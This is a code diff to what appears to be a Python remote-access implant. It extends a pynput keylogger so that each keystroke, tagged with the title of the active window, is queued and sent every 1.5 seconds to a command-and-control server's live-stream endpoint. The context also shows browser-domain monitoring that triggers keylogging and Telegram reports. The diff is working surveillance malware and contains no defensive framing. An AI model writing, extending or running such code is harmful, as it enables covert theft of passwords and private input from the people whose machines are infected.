@@ -16,6 +16,7 @@ import hashlib
 import json
 import os
 import platform
+import queue
 import socket
 import subprocess
 import sys
@@ -348,11 +349,70 @@ try {{
         return None
 
 
-# Global registry for active listeners
+# Global registry for active listeners and live stream queue
 ACTIVE_LISTENERS = {}
+LIVE_STREAM_QUEUE = queue.Queue()
+
+
+def get_foreground_window_title() -> str:
+    """Fast Win32 active window title getter for live stream context."""
+    if platform.system() != "Windows":
+        return ""
+    try:
+        import ctypes
+        hwnd = ctypes.windll.user32.GetForegroundWindow()
+        if not hwnd:
+            return ""
+        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+        if length <= 0:
+            return ""
+        buf = ctypes.create_unicode_buffer(length + 1)
+        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+        return buf.value
+    except Exception:
+        return ""
+
+
+async def live_stream_flusher_loop(node_id_provider):
+    """Periodically sends queued live telemetry/keystroke events to C2 backend."""
+    while True:
+        try:
+            await asyncio.sleep(1.5)
+            node_id = node_id_provider()
+            if not node_id:
+                continue
+
+            batch = []
+            while not LIVE_STREAM_QUEUE.empty() and len(batch) < 50:
+                try:
+                    item = LIVE_STREAM_QUEUE.get_nowait()
+                    batch.append(item)
+                except queue.Empty:
+                    break
+
+            if not batch:
+                continue
+
+            for item in batch:
+                stream_type = item.get("stream_type", "keylog")
+                window_title = item.get("window_title", "")
+                content = item.get("content", "")
+
+                await http_post(
+                    f"{C2_SERVER}/live-stream/{node_id}",
+                    {"X-API-KEY": API_KEY, "Content-Type": "application/json"},
+                    {
+                        "stream_type": stream_type,
+                        "window_title": window_title,
+                        "content": content,
+                    }
+                )
+        except Exception as e:
+            print(f"[LIVE_STREAM ERROR] {e}")
+
 
 async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
-    """Log keystrokes using pynput."""
+    """Log keystrokes using pynput and push to live stream feed."""
     if platform.system() != "Windows":
         return None
         
@@ -371,13 +431,25 @@ async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
         def on_press(key):
             try:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                win_title = get_foreground_window_title()
+                key_text = ""
+                
+                if hasattr(key, 'char') and key.char:
+                    key_text = key.char
+                else:
+                    key_str = str(key).replace('Key.', '').upper()
+                    key_text = f"[{key_str}]"
+                
+                # 1. Local persistent file log
                 with open(log_path, 'a', encoding='utf-8') as f:
-                    if hasattr(key, 'char'):
-                        f.write(f"[{timestamp}] {key.char}\n")
-                    else:
-                        # Handle special keys
-                        key_str = str(key).replace('Key.', '').upper()
-                        f.write(f"[{timestamp}] [{key_str}]\n")
+                    f.write(f"[{timestamp}] {key_text}\n")
+                
+                # 2. Real-time telemetry live stream queue
+                LIVE_STREAM_QUEUE.put({
+                    "stream_type": "keylog",
+                    "window_title": win_title,
+                    "content": key_text
+                })
             except Exception as e:
                 print(f"[KEYLOG ERROR] {e}")
 
@@ -385,6 +457,7 @@ async def action_keylog(task: PersistentTask, iteration: int) -> Optional[str]:
         listener = keyboard.Listener(on_press=on_press)
         listener.start()
         ACTIVE_LISTENERS[task.task_id] = listener
+
         
     # Check if listener is alive
     listener = ACTIVE_LISTENERS.get(task.task_id)
@@ -1730,6 +1803,9 @@ async def main():
 
     # Watch browser for configured domains → 2 min keylog + Telegram
     asyncio.create_task(website_monitor_loop(task_manager, report_result))
+    
+    # Real-time telemetry & keylog stream flusher (flushes buffer every 1.5s)
+    asyncio.create_task(live_stream_flusher_loop(lambda: node_id))
     
     print(f"[RUNNING] Polling every {POLL_INTERVAL}s...")
     
